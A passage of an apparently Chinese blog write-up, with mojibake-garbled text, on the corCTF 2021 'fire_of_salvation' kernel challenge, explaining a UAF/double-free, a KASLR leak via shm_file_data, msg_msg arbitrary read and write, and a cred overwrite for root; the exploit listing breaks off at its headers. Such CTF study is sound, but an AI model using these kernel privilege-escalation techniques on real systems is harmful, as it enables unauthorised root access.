class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="msgåˆ©ç”¨"><a href="#msgåˆ©ç”¨" class="headerlink" title="msgåˆ©ç”¨"></a>msgåˆ©ç”¨</h2><p>åªè¦èƒ½æ§åˆ¶äº†msg_msgåç¡®å®å¯ä»¥è¾¾åˆ°ä»»æ„åœ°å€å†™å’Œä»»æ„åœ°å€è¯»ï¼Œè€Œä¸”å †å—èŒƒå›´æ˜¯<code>0x40~0x1000</code>,æ„Ÿè§‰éå¸¸å¥½ç”¨ã€‚</p>
<p>æœ¬æ–‡é€šè¿‡<code>corCTF 2021</code>ä¸¤é“å†…æ ¸é¢˜å­¦ä¹ å¯¹msg_msgçš„åˆ©ç”¨ã€‚åº”è¯¥ä¼šå¾ˆæœ‰éš¾åº¦ï¼Œé¢„è®¡å¤ç°è‡³å°‘ä¸¤å¤©ã€‚(çœ‹å®Œæ•´ä¸ªè§£é¢˜æ€è·¯å’Œé•¿è¾¾400å¤šè¡Œä»¥åŠ700å¤šè¡Œçš„exp,ğŸ¤¦â€â™€ï¸åäº†ï¼Œä¸åªæ˜¯éœ€è¦ä¸¤å¤©äº†ã€‚è‡³å°‘ä¸€å‘¨æˆ–è€…æ›´ä¹…ã€‚ã€‚ã€‚</p>
<h3 id="fire-of-salvation"><a href="#fire-of-salvation" class="headerlink" title="fire_of_salvation"></a>fire_of_salvation</h3><p>é¢˜ç›®ç»™äº†æºä»£ç ååˆ†å¥½å®¡è®¡ï¼Œä¸»è¦ç»“æ„ä½“å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> EASY_MODE</span></span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">user_rule_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> EASY_MODE</span></span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">rule_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h4><p>æ¼æ´å‡ºç°åœ¨äº†dup()å‡½æ•°ä¸‹ï¼Œåœ¨å…¨å±€æŒ‡é’ˆæ•°ç»„ä¸­å¯ä»¥å­˜å‚¨ä¸¤æ¬¡æŒ‡å‘åŒä¸€ä¸ªå †å—çš„æŒ‡é’ˆï¼Œè¿™å¯¼è‡´å¯ä»¥é‡Šæ”¾ä¸¤æ¬¡åŒä¸€ä¸ªå †å—ï¼Œæ—¢å¯ä»¥doublefreeåˆå¯ä»¥uaf.</p>
<h4 id="å¡«å‘"><a href="#å¡«å‘" class="headerlink" title="å¡«å‘"></a>å¡«å‘</h4><p>ä»¤äººæ„Ÿå¹ï¼Œè·ç¦»å†™ä¸‹ä¸Šä¸€æ®µè¯åˆ°ç°åœ¨å·²ç»è¿‡äº†åŠä¸ªæœˆäº†ï¼Œç¡®å®æ‡’ç‹—äº†è¿™ä¸‹ï¼Œæœ¬æ¥æƒ³ç€å­¦å®Œmit6.s081åå†ç»§ç»­å­¦ä¹ äºŒè¿›åˆ¶çš„ï¼Œä½†æ˜¯è‚äº†ä¸€å‘¨äº†æœ‰ç‚¹è‚ä¸åŠ¨äº†ï¼Œå‰é¢è¿˜å¥½è¯´ï¼Œåé¢çš„è¯¾ç¡®å®æ²¾ç‚¹éš¾åº¦äº†ï¼Œä¸€ä¸ªåŠå°æ—¶çš„è¯¾æˆ‘å¾—çœ‹ä¸‰ä¸ªå°æ—¶æ‰èƒ½å•ƒä¸‹æ¥ï¼Œæƒ³èµ·äº†<code>msg</code>è¿˜æ²¡å­¦å®Œï¼Œé‚£å°±æ¢ä¸ªä¸œè¥¿æŠ˜ç£¨æˆ‘å§ã€‚</p>
<h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>ç”±äºå¼€å¯äº†kaslrå’Œfg_kaslr,æ‰€ä»¥è‚¯å®šå¾—å…ˆè·å–å†…æ ¸åœ°å€ï¼Œä½†æ˜¯æ³¨æ„ç”±äºå¼€å¯äº†<code>fg_kaslr</code>ä¹‹åå°±æ²¡æœ‰é‚£ä¹ˆç®€å•äº†ï¼Œ<code>fg_kaslr</code>ä¼šåœ¨<code>kaslr</code>ä¸Šä»¥å‡½æ•°ç²’åº¦å¯¹åœ°å€å†è¿›ä¸€æ­¥æ‰“ä¹±ï¼Œè¿™ä¸ªæ‰“ä¹±ä¹Ÿæ˜¯éšæœºçš„ï¼Œæ‰€ä»¥å‡½æ•°åˆ°å†…æ ¸åŸºåœ°å€çš„åç§»æ˜¯éšæ—¶å‘ç°å˜åŒ–çš„ï¼Œä½†æ˜¯<code>fg_kaslr</code>æœ‰äº›åŒºåŸŸä¸ä¼šè¢«æ‰“ä¹±</p>
<blockquote>
<p>1..textæ®µ</p>
<p>2.dataæ®µ</p>
<p>3.__ksymtab</p>
</blockquote>
<p>çŸ¥é“äº†ä¸Šé¢åŒºåŸŸçš„ä¸€äº›åœ°å€å°±å¯ä»¥çŸ¥é“å†…æ ¸çš„åŸºåœ°å€äº†ã€‚åœ¨è¿™é“é¢˜ä¸­é€‰æ‹©ä½¿ç”¨<code>shm_file_data</code>ç»“æ„ä½“æ¥æ³„éœ²å†…æ ¸dataæ®µåœ°å€è¿›è€ŒçŸ¥é“å†…æ ¸åŸºåœ°å€ã€‚å…¶ä¸­<code>ipc_namespace</code>å°±æŒ‡å‘å†…æ ¸dataæ®µã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ³„éœ²åœ°å€å¯ä»¥åˆ†ä¸ºä¸€ä¸‹å‡ æ­¥</p>
<ul>
<li>1.é¦–å…ˆæ„é€ ä¸€ä¸ª4kbçš„uafç„¶åç”³è¯·ä¸€ä¸ª<code>0xfd8</code>å¤§å°çš„<code>msg_msg</code>ï¼Œæ­¤æ—¶<code>msg</code>ç»“æ„ä½“å¦‚ä¸‹å›¾</li>
</ul>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221017001913589.png" alt="image-20221017001913589"></p>
<ul>
<li>2.å †å–·ï¼Œè¿™æ ·<code>shm_file_data</code>å°±å¯èƒ½è½åˆ°<code>struct msg_msg</code>ä¸‹é¢äº†</li>
<li>3.åˆ©ç”¨<code>uaf</code>ä¿®æ”¹<code>m_ts</code>ï¼Œè¿™ä¸ªå˜é‡è®°å½•äº†è¿™ä¸ªæ¶ˆæ¯çš„å¤§å°ï¼Œæ”¹å¤§ä¹‹åå†<code>MSG_COPY</code>è¿™ä¸ªæ¶ˆæ¯é˜Ÿåˆ—å°±å¯ä»¥å¯ä»¥å¾—åˆ°<code>struct msg_msg</code>åé¢çš„å †çš„ä¿¡æ¯äº†ï¼Œä¹Ÿå°±å¾—åˆ°äº†å†…æ ¸åŸºåœ°å€ã€‚</li>
<li>4.åˆ©ç”¨åŸºåœ°å€å°±å¯ä»¥ç®—å‡º<code>init_cred</code>å’Œ<code>init_task</code>äº†ï¼Œè¿™ä¸¤ä¸ªç»“æ„ä½“éƒ½åœ¨å†…æ ¸dataæ®µä¸­ï¼Œå¯ä»¥ç›´æ¥ç®—å‡ºã€‚</li>
</ul>
<p>å¾—åˆ°ä¸Šé¢çš„åœ°å€å°±å¯ä»¥åˆ©ç”¨<code>init_task</code>æ¥æ‰¾åˆ°è¿™ä¸ªè¿›ç¨‹çš„<code>task_struct</code>äº†ã€‚</p>
<p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ª<code>task_struct</code>ï¼Œå†…æ ¸ä½¿ç”¨åŒå‘å¾ªç¯è¡¨æ¥ç»„ç»‡è¿™ä¸ªç»“æ„ä½“ï¼Œå­—æ®µä¸º<code>struct list_head        tasks;</code></p>
<p>ç»“æ„ä½“å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯ä»¥é€šè¿‡<code>init_task</code>çš„<code>prev</code>å‘ä¸Šå¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°è¿™ä¸ªè¿›ç¨‹çš„<code>task_struct</code>ã€‚</p>
<p>è¯´ç™½äº†å°±æ˜¯é€šè¿‡ä¿®æ”¹<code>msg</code>çš„<code>next</code>å­—æ®µå®Œæˆä»»æ„è¯»æ“ä½œï¼Œå…³é”®æ˜¯å¦‚ä½•æ„é€ <code>msg</code>äº†ï¼Œä¸‹é¢æ˜¯ä½œè€…ç»™å‡ºçš„æ„é€ ç¤ºæ„å›¾ï¼Œæˆ‘ä¹Ÿæ˜¯æŒ‰ç…§è¿™ä¸ªè¿›è¡Œæ„é€ çš„ï¼Œæˆ‘ä»¬å¾—è¦†ç›–<code>next</code>è®©å…¶æŒ‡å‘<code>task_struct</code>çš„æŸä¸€ä¸ªåœ°æ–¹ï¼Œç„¶åå†è¯»è¿™ä¸ª<code>task_struct</code>ï¼Œä½†æ˜¯å¯¹<code>next</code>çš„è¦†ç›–æ˜¯æœ‰è¦æ±‚çš„ï¼Œä»–æ‰€æŒ‡å‘çš„åœ°å€çš„å‰å…«ä¸ªå­—èŠ‚å¿…é¡»ä¸ºç©ºï¼Œä¸ç„¶è¯»å–å’Œå†™å…¥çš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œå…·ä½“åŸå› çœ‹çœ‹æºç å°±æ‡‚äº†ã€‚</p>
<p>å…¶ä¸­<code>struct list_head        tasks</code>åœ¨ä½äº<code>task_struct</code>çš„0x298åç§»å‡ºï¼Œå…¶å‰å…«ä¸ªå­—èŠ‚åˆšå¥½æ˜¯<code>null</code>,æ‰€ä»¥å¯ä»¥è®©<code>next</code>æŒ‡å‘<code>task_struct_addr+0x290</code>å¤„ã€‚è¿™æ ·å°±å¯ä»¥è¯»åˆ°<code>task_struct</code>çš„<code>prev</code>å’Œ<code>pid</code>äº†ï¼Œpidä½äº<code>task_struct</code>çš„0x398å¤„ï¼Œç„¶åæ•´ä¸€ä¸ªå¾ªç¯è¯»åˆ°å½“å‰è¿›ç¨‹çš„<code>task_struct</code>äº†ã€‚</p>
<p><img src="https://1.bp.blogspot.com/-Y-YqvmgaX1U/YSggQhwb5pI/AAAAAAAACIc/leKw-FMmY_8TuX-rqv_H0Get2kT3NFEEACLcBGAsYHQ/w640-h426/3.png" alt="img"></p>
<p>æ³¨æ„<code>prev</code>å¹¶ä¸æŒ‡å‘ä¸Šä¸€ä¸ªè¿›ç¨‹çš„<code>task_struct</code>çš„å¼€å¤´ï¼Œè€Œæ˜¯æŒ‡å‘å…¶ä¸­çš„å­—æ®µ<code>struct list_head tasks</code>ï¼Œæ‰€ä»¥å‡å»0x298å°±å¾—åˆ°å½“å‰<code>task_struct</code>çš„åŸºåœ°å€äº†ã€‚</p>
<p>å¾—åˆ°å½“å‰è¿›ç¨‹<code>task_struct</code>çš„åŸºåœ°å€åå°±å¾—æ„é€ ä»»æ„åœ°å€å†™æ¥å®Œæˆå¯¹å½“å‰è¿›ç¨‹<code>task_struct</code>ä¸­çš„<code>real_cred å’Œ cred</code>æŒ‡é’ˆçš„è¦†å†™ï¼Œè¦†å†™æˆ<code>init_cred</code>æŒ‡é’ˆã€‚</p>
<p>é¦–å…ˆè€ƒè™‘<code>msg</code>çš„<code>next</code>åº”è¯¥æŒ‡å‘å“ªé‡Œï¼Œ<code>read_cred</code>å’Œ<code>cred</code>å¯¹äº<code>task_struct</code>çš„åç§»æ˜¯0x538å’Œ0x540ã€‚<code>real_cred</code>çš„å‰å…«ä¸ªå­—èŠ‚åˆšå¥½è¿˜æ˜¯<code>null</code>,æ‰€ä»¥å¯ä»¥è®©<code>next</code>æŒ‡å‘<code>task_struct+0x538-0x8</code>.</p>
<p><img src="https://1.bp.blogspot.com/-MhE76o_slr0/YSfwYpL-e-I/AAAAAAAACIQ/-ThXZ-1XlH4-hQJzKbxsJazF73c8g_SWQCLcBGAsYHQ/w640-h402/4.png" alt="img"></p>
<p>åªè¦è€ƒè™‘æ¸…æ¥š<code>next</code>çš„çš„å–å€¼é—®é¢˜ï¼Œä»»æ„åœ°å€å†™å°±æ˜¯å¥—<code>userfaulted</code>çš„æ¿å­äº†,æ­¥éª¤å¦‚ä¸‹</p>
<ul>
<li>å…ˆmmapä¸€æ®µox2000çš„å†…å­˜ï¼Œç„¶ååœ¨0x1000-0x8å¤„å¡«ä¸Šmtype,æŠŠ0x1000æ³¨å†Œç¼ºé¡µå¤„ç†ï¼Œç„¶å<code>send_msg(msg_id, msg_buff, size - 0x30, 0);</code></li>
<li>å½“msgè¿›å…¥ç¼ºé¡µå¤„ç†å‡½æ•°çš„æ—¶å€™ï¼Œå‡†å¤‡å¥½<code>page</code>,å…¶<code>0xfd0</code>å’Œ<code>0xfd8</code>å¤„å‡†å¤‡å¥½<code>init_cred</code>ï¼Œç„¶ååˆ©ç”¨è®¾å¤‡çš„editä¿®æ”¹<code>msg</code>çš„nextæŒ‡é’ˆ</li>
</ul>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;byteswap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reboot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RULE 0x1337babe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_RULE 0xdeadbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_RULE 0x1337beef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_RULE 0xdeadbeef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUP_RULE 0xbaad5aad</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_API 0xc018aa3f</span></span><br><span 